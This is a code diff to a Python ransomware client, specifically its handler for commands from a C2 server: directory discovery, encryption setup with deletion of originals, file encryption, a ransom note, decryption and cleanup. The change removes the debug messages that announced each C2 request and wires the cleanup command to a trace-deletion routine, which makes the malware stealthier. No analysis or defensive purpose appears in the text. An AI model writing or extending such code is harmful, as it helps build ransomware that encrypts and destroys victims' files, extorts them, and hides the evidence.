@@ -321,8 +321,8 @@ class Program():
                 self.__id = message.get("data", {}).get("id", "")
                 print("ID SET", self.__id)
                 return None
+            
             case "discovery_req":
-                print("Discovery request received from C2 server.")
                 self.__directory(start_path=message_data.get("initial_directory", "/"))
                 message_reply["type"] = "discovery_rep"
                 message_reply["data"] = {
@@ -330,7 +330,6 @@ class Program():
                     "directories": len(self.__directories_with_files)
                 }
             case "crypto_req":
-                print("Cryptographic setup request received from C2 server.")
                 self.__setup(
                     should_encrypt=message_data.get("encrypt", False),
                     should_delete_original=message_data.get("delete", False),
@@ -343,20 +342,17 @@ class Program():
                 }
 
             case "encryption_req":
-                print("Encryption request received from C2 server.")
                 result = self.__encrypt()
                 message_reply["type"] = "encryption_rep"
                 message_reply["data"] = {"total_time": 1 if result else -1}
                 return message_reply
             
             case "ransomnote_req":
-                print("Ransom note request received from C2 server.")
                 self.__ransomnote()
                 message_reply["type"] = "ransomnote_rep"
                 message_reply["data"] = {}
                 
             case "decryption_rep":
-                print("Decryption reply received from C2 server.")
                 should_decrypt = message_data.get("status", False)
                 result = False
 
@@ -375,8 +371,10 @@ class Program():
                 message_reply["data"] = {"result": result}
                 
             case "cleaning_req":
-                print("Cleaning request received from C2 server.")
-                pass
+                self.delete_traces()
+                message_reply["type"] = "cleaning_rep"
+                message_reply["data"] = {}
+
             case _:
                 print(f"Unknown message type from C2 server: {message.get('type')}")
                 return None
@@ -386,9 +384,6 @@ class Program():
     async def send_decryption_request(self):
         if self.__client is not None:
             await self.__client.send_decryption_req()
-
-
-        
 
     def load_key(self, key_filename: str = "secret.key"):
         if self.__criptography is None:
